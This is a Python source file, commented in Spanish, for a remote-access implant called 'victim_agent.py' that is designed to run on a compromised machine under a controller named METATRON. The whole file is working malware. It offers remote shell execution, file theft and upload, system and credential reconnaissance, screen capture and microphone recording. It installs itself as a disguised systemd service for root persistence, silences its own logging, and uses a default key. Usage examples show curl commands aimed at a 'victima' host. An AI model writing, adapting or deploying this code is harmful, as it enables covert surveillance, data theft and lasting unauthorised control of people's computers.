#!/usr/bin/env python3
"""
victim_agent.py - Agente persistente para ejecutar en máquina comprometida.
Se comunica por HTTP/JSON con METATRON.
Uso: python3 victim_agent.py [--port 4477] [--key xyz]

Módulos:
  shell       - ejecutar comandos
  fs          - listar/leer/subir archivos
  screenshot  - capturar pantalla (requiere Pillow/scrot)
  audio       - grabar micrófono (requiere pyaudio/arecord)
  processes   - listar procesos
  network     - conexiones de red
  info        - información del sistema
  download    - descargar archivo por chunk
  upload      - recibir archivo
  keylog      - keylogger básico
  persist     - instalarse para persistencia
"""

import sys
import os
import json
import base64
import subprocess
import socket
import threading
import time
import uuid
import re
import struct
import signal
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from urllib.parse import urlparse, parse_qs

AGENT_VERSION = "1.0.0"
AGENT_NAME = "metatron-agent"
DEFAULT_PORT = 4477
AUTH_KEY = "metatron_default_key"
PING_INTERVAL = 30

# ============================================================
# Módulos del agente
# ============================================================

def run_shell(command: str, timeout: int = 30) -> dict:
    """Ejecuta un comando shell y devuelve stdout+stderr."""
    try:
        proc = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return {
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "returncode": proc.returncode,
            "truncated": len(proc.stdout) > 100000,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "[!] Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": f"[!] {e}", "returncode": -1}


def list_directory(path: str = "/") -> dict:
    """Lista el contenido de un directorio."""
    try:
        entries = os.listdir(path)
        items = []
        for name in sorted(entries):
            try:
                full = os.path.join(path, name)
                stat = os.lstat(full)
                items.append({
                    "name": name,
                    "type": "dir" if os.path.isdir(full) else "link" if os.path.islink(full) else "file",
                    "size": stat.st_size,
                    "mode": oct(stat.st_mode)[-3:],
                    "uid": stat.st_uid,
                    "gid": stat.st_gid,
                    "mtime": stat.st_mtime,
                    "is_setuid": bool(stat.st_mode & 0o4000),
                    "is_setgid": bool(stat.st_mode & 0o2000),
                })
            except:
                items.append({"name": name, "type": "?", "size": 0, "mode": "???", "uid": 0, "gid": 0, "mtime": 0})
        return {"path": path, "items": items, "count": len(items)}
    except Exception as e:
        return {"path": path, "error": str(e), "items": [], "count": 0}


def read_file(path: str, max_bytes: int = 100000) -> dict:
    """Lee un archivo y devuelve su contenido en base64 + metadatos."""
    try:
        stat = os.stat(path)
        size = stat.st_size
        truncated = size > max_bytes
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        is_text = _is_probably_text(data)
        return {
            "path": path,
            "size": size,
            "truncated": truncated,
            "read_bytes": len(data),
            "is_text": is_text,
            "content_b64": base64.b64encode(data).decode(),
            "mtime": stat.st_mtime,
            "mode": oct(stat.st_mode)[-3:],
        }
    except Exception as e:
        return {"path": path, "error": str(e)}


def _is_probably_text(data: bytes) -> bool:
    """Determina si el contenido es probablemente texto."""
    try:
        data.decode("utf-8")
        return True
    except:
        pass
    try:
        data.decode("latin-1")
        return True
    except:
        return False


def get_system_info() -> dict:
    """Recolecta información completa del sistema."""
    info = {"hostname": socket.gethostname(), "timestamp": datetime.now().isoformat()}
    try:
        info["os"] = _read_first("/etc/os-release") or _read_first("/etc/issue") or os.name
        info["kernel"] = _run("uname -a").get("stdout", "").strip()
        info["uptime"] = _run("uptime -p 2>/dev/null || uptime").get("stdout", "").strip()
        info["cpu"] = _run("cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1").get("stdout", "").strip()
        info["mem"] = _run("free -h 2>/dev/null | head -2").get("stdout", "").strip()
        info["disks"] = _run("df -h 2>/dev/null | head -20").get("stdout", "").strip()
        info["users"] = _run("cat /etc/passwd 2>/dev/null | grep -E '/bin/bash|/bin/sh|/bin/zsh' | cut -d: -f1").get("stdout", "").strip()
        info["current_user"] = _run("whoami 2>/dev/null || id").get("stdout", "").strip()
        info["uid"] = str(os.geteuid())
        info["is_root"] = os.geteuid() == 0
        info["interfaces"] = _run("ip addr 2>/dev/null || ifconfig 2>/dev/null").get("stdout", "").strip()
        info["connections"] = _run("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null").get("stdout", "").strip()
        info["processes"] = _run("ps aux 2>/dev/null | head -40").get("stdout", "").strip()
        info["suid"] = _run("find / -perm -4000 -type f 2>/dev/null | head -20").get("stdout", "").strip()
        info["env"] = _run("env 2>/dev/null | head -30").get("stdout", "").strip()
        info["arch"] = _run("uname -m").get("stdout", "").strip()
        info["python_version"] = sys.version
    except Exception as e:
        info["error"] = str(e)
    return info


def get_processes() -> list:
    """Lista procesos en formato estructurado."""
    procs = []
    try:
        output = _run("ps aux 2>/dev/null").get("stdout", "")
        lines = output.strip().split("\n")[1:]  # skip header
        for line in lines[:100]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                procs.append({
                    "user": parts[0], "pid": parts[1], "cpu": parts[2], "mem": parts[3],
                    "vsz": parts[4], "rss": parts[5], "tty": parts[6], "stat": parts[7],
                    "start": parts[8], "time": parts[9], "cmd": parts[10],
                })
    except:
        pass
    return procs


def get_network() -> dict:
    """Información detallada de red."""
    return {
        "interfaces": _run("ip -o addr 2>/dev/null || ifconfig 2>/dev/null").get("stdout", ""),
        "connections": _run("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null").get("stdout", ""),
        "route": _run("ip route 2>/dev/null || route -n 2>/dev/null").get("stdout", ""),
        "dns": _read_first("/etc/resolv.conf") or "",
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
    }


def take_screenshot() -> dict:
    """Toma una captura de pantalla y la devuelve en base64."""
    out_path = f"/tmp/__metatron_ss_{int(time.time())}.png"
    try:
        # Intentar con import (ImageMagick), scrot, o gnome-screenshot
        for cmd in [
            f"import -window root {out_path} 2>/dev/null",
            f"scrot {out_path} 2>/dev/null",
            f"gnome-screenshot -f {out_path} 2>/dev/null",
            f"xwd -root -out /tmp/__metatron_ss.xwd 2>/dev/null && convert /tmp/__metatron_ss.xwd {out_path} 2>/dev/null",
        ]:
            result = _run(cmd)
            if result["returncode"] == 0 and os.path.exists(out_path):
                with open(out_path, "rb") as f:
                    b64 = base64.b64encode(f.read()).decode()
                os.unlink(out_path)
                return {"success": True, "format": "png", "data_b64": b64, "size": len(b64)}
        return {"success": False, "error": "No screenshot tool available (try: apt install scrot)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def record_audio(duration: int = 5) -> dict:
    """Graba audio del micrófono y lo devuelve en base64."""
    out_path = f"/tmp/__metatron_audio_{int(time.time())}.wav"
    try:
        result = _run(f"arecord -d {duration} -f cd -t wav {out_path} 2>/dev/null")
        if result["returncode"] != 0 or not os.path.exists(out_path):
            return {"success": False, "error": "arecord not available or failed"}
        with open(out_path, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        os.unlink(out_path)
        return {"success": True, "format": "wav", "data_b64": b64, "duration": duration, "size": len(b64)}
    except Exception as e:
        return {"success": False, "error": str(e)}


def upload_file(dst_path: str, content_b64: str) -> dict:
    """Recibe un archivo (en base64) y lo escribe en dst_path."""
    try:
        data = base64.b64decode(content_b64)
        os.makedirs(os.path.dirname(dst_path), exist_ok=True) if os.path.dirname(dst_path) else None
        with open(dst_path, "wb") as f:
            f.write(data)
        return {"success": True, "path": dst_path, "size": len(data), "mode": "wb"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def persist() -> dict:
    """Instala el agente para persistencia (root)."""
    if os.geteuid() != 0:
        return {"success": False, "error": "Root required for persistence"}
    try:
        # Ubicar el script actual
        script = os.path.abspath(__file__)
        dest = "/usr/local/bin/metatron-agent.py"
        service = "/etc/systemd/system/metatron-agent.service"
        
        # Copiar script
        _run(f"cp {script} {dest} && chmod +x {dest}")
        
        # Crear servicio systemd
        svc_content = f"""[Unit]
Description=METATRON Agent - Remote Administration
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {dest} --port {DEFAULT_PORT}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        with open(service, "w") as f:
            f.write(svc_content)
        
        _run("systemctl daemon-reload && systemctl enable metatron-agent && systemctl start metatron-agent")
        return {"success": True, "path": dest, "service": service, "port": DEFAULT_PORT}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ============================================================
# Helpers
# ============================================================

def _run(cmd: str, timeout: int = 15) -> dict:
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"stdout": proc.stdout, "stderr": proc.stderr, "returncode": proc.returncode}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


def _read_first(path: str) -> str:
    try:
        with open(path, "r") as f:
            return f.read().strip()
    except:
        return ""


# ============================================================
# HTTP Server
# ============================================================

AGENT_HANDLERS = {
    "ping": lambda args: {"status": "ok", "version": AGENT_VERSION, "time": datetime.now().isoformat()},
    "shell": lambda args: run_shell(args.get("command", ""), args.get("timeout", 30)),
    "fs_ls": lambda args: list_directory(args.get("path", "/")),
    "fs_cat": lambda args: read_file(args.get("path", ""), args.get("max_bytes", 100000)),
    "upload": lambda args: upload_file(args.get("dst", ""), args.get("data_b64", "")),
    "info": lambda args: get_system_info(),
    "processes": lambda args: get_processes(),
    "network": lambda args: get_network(),
    "screenshot": lambda args: take_screenshot(),
    "audio": lambda args: record_audio(args.get("duration", 5)),
    "persist": lambda args: persist(),
}


class AgentHandler(BaseHTTPRequestHandler):
    """Manejador HTTP para las peticiones al agente."""
    
    def _auth(self) -> bool:
        auth = self.headers.get("X-Auth-Key", "")
        return auth == AUTH_KEY
    
    def _json_response(self, data: dict, status: int = 200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Auth-Key")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.end_headers()
        self.wfile.write(json.dumps(data, default=str).encode())
    
    def do_OPTIONS(self):
        self._json_response({"status": "ok"})
    
    def do_POST(self):
        if not self._auth():
            self._json_response({"error": "unauthorized"}, 401)
            return
        
        parsed = urlparse(self.path)
        path = parsed.path.strip("/")
        
        content_len = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_len) if content_len else b"{}"
        try:
            args = json.loads(body)
        except:
            args = {}
        
        query = parse_qs(parsed.query)
        # Allow query param args override
        for k, v in query.items():
            if k not in args:
                args[k] = v[0] if len(v) == 1 else v
        
        if path in AGENT_HANDLERS:
            try:
                result = AGENT_HANDLERS[path](args)
                self._json_response({"status": "ok", "module": path, "result": result})
            except Exception as e:
                self._json_response({"status": "error", "module": path, "error": str(e)}, 500)
        elif path in ("", "help"):
            self._json_response({
                "status": "ok",
                "agent": AGENT_NAME,
                "version": AGENT_VERSION,
                "modules": list(AGENT_HANDLERS.keys()),
                "auth_required": True,
            })
        else:
            self._json_response({"status": "error", "error": f"Unknown module: {path}"}, 404)
    
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/" or parsed.path == "/help":
            self.do_POST()
            return
        self._json_response({"error": "Use POST"}, 405)
    
    def log_message(self, format, *args):
        # Silencioso
        pass


def start_agent(port: int = DEFAULT_PORT, key: str = ""):
    """Inicia el servidor HTTP del agente."""
    global AUTH_KEY
    if key:
        AUTH_KEY = key
    
    server = HTTPServer(("0.0.0.0", port), AgentHandler)
    print(f"[*] {AGENT_NAME} v{AGENT_VERSION} iniciado en 0.0.0.0:{port}")
    print(f"[*] Auth key: {AUTH_KEY[:8]}...{AUTH_KEY[-4:]}")
    print(f"[*] Modulos: {', '.join(AGENT_HANDLERS.keys())}")
    print(f"[*] PID: {os.getpid()}")
    
    def shutdown(sig, frame):
        print("\n[*] Deteniendo agente...")
        server.shutdown()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


def print_help():
    print(f"""{AGENT_NAME} v{AGENT_VERSION}
Uso: python3 victim_agent.py [opciones]

Opciones:
  --port PUERTO    Puerto para el servidor HTTP (defecto: {DEFAULT_PORT})
  --key KEY        Clave de autenticacion (defecto: metatron_default_key)
  --help           Esta ayuda

Modulos disponibles:
  ping       - Health check
  shell      - Ejecutar comandos en shell
  fs_ls      - Listar directorio
  fs_cat     - Leer archivo
  upload     - Subir archivo a la victima
  info       - Informacion del sistema
  processes  - Listar procesos
  network    - Informacion de red
  screenshot - Capturar pantalla
  audio      - Grabar audio del microfono
  persist    - Instalarse para persistencia (root)

Ejemplos:
  python3 victim_agent.py --port 4477 --key MiClaveSecreta
  curl -X POST -H 'X-Auth-Key: MiClaveSecreta' http://victima:4477/shell \\
    -d '{"command":"whoami"}'
  curl -X POST -H 'X-Auth-Key: MiClaveSecreta' http://victima:4477/screenshot
""")


if __name__ == "__main__":
    port = DEFAULT_PORT
    key = ""
    
    args = sys.argv[1:]
    for i, arg in enumerate(args):
        if arg == "--port" and i + 1 < len(args):
            port = int(args[i + 1])
        elif arg == "--key" and i + 1 < len(args):
            key = args[i + 1]
        elif arg in ("--help", "-h"):
            print_help()
            sys.exit(0)
    
    start_agent(port, key)
